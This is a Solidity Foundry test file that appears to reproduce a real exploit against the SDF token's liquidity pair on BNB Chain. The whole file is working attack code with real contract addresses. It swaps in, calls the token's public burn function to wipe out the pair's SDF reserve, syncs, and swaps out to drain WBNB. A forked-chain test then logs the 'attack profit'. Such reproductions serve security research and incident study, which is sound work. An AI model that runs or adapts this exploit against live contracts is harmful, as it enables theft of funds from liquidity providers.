pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interfaces/Cheatcodes.sol";
import "./interfaces/IUniswapV2Pair.sol";
import "./interfaces/IERC20.sol";

interface ISDF {
    function burn(address account, uint256 _amount) external;
}

contract Exploit {
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address SDF = 0x10bc28d2810dD462E16facfF18f78783e859351b;
    address lp = 0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A;
    constructor() payable{
        WBNB.call{value: 0.001 ether}("");
        IERC20(WBNB).transfer(lp, 0.001 ether);
        (uint256 SDFreserve, , ) = IUniswapV2Pair(lp).getReserves();
        uint256 nowWBNBreserve = IERC20(WBNB).balanceOf(lp);    
        uint256 SDFoutAmount = uint256((0.001 ether * 9975 * SDFreserve)) / (0.001 ether * 9975 + nowWBNBreserve * 10000);
        IUniswapV2Pair(lp).swap(SDFoutAmount, 0, address(this), "");
        ISDF(SDF).burn(lp, IERC20(SDF).balanceOf(lp) - 1);
        IUniswapV2Pair(lp).sync();
        IERC20(SDF).transfer(lp, IERC20(SDF).balanceOf(address(this)));
        (, uint256 WBNBreserve, ) = IUniswapV2Pair(lp).getReserves();
        uint256 nowSDFreserve = IERC20(SDF).balanceOf(lp);
        uint256 WBNBoutAmount = uint256((SDFreserve * 9975 * WBNBreserve)) / (SDFreserve * 9975  + nowSDFreserve * 10000);
        IUniswapV2Pair(lp).swap(0, WBNBoutAmount, address(this),"" );
    }

    fallback() external payable{}
}
contract test is DSTest{
    Exploit internal exploit;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("bsc", 20969095);
    }
    function testExploit() public {
        exploit = new Exploit{value: 0.001 ether}();
        verify();
    }

    function verify() public {
        console.log("============== Attack profit: ~", IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c).balanceOf(address(exploit)) / 1e18 ,"WBNB", "==============");
    }
}
